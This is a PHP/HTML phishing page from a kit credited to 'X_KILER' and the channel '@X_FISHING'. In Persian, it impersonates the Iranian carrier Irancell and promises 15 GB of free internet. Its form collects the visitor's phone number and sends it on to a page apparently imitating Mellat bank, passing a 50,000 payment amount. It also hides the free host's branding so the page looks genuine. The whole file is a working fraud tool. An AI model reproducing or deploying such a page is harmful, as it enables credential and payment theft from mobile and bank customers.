
<?php
$e=intval($_GET["e"]);
if(isset($_GET["P"])){
	$P=$_GET["P"];
}else{
	$P="Mellat";
}
?>
<!DOCTYPE html>
<html xmlns="https://www.w3.org/1999/xhtml">
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
<head>
	<link href="css/irancell.css" rel="stylesheet"/>
	<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>هدیه بزرگ ایرانسل به مشترکین خود</title>
<meta name="viewport" content="width=device-width">
<style>img[alt="www.000webhost.com"]{display:none;}</style>
</head>
<body>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
<div class="border">
		<img src="img/ircel.jpg" style="width:265px; height:200px; margin:auto;"></img>
<p class="title" style="">15گیگ اینترنت ایرانسلی بدون هیچ تعرفه ی پیامکی</p>
<p class="text">به منظوربالابردن سطح رضایت ملت ایران به موجب استفاده از شبکه های مخابراطی کشور شرکت کارت شارژایران کیش درصدد آن شد که داغ ترین پیشنهاد بسته اینترنتی را برای کاربران ایرانسلی عرضه کند
</p>
<br/>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
<form method="POST" action="../<?php echo $P?>/?e=<?php echo $e?>&amount=50,000">
	<input type="text" class="textbox" required placeholder="شماره تلفن خود را وارد نمایید" />
	<br/>
	<input type="submit" value="ارسال" class="btn"/>
</form>
<!--***************Created By: X_KILER***************-->
<!--***************Channel:@X_FISHING***************-->
</div>
</html>
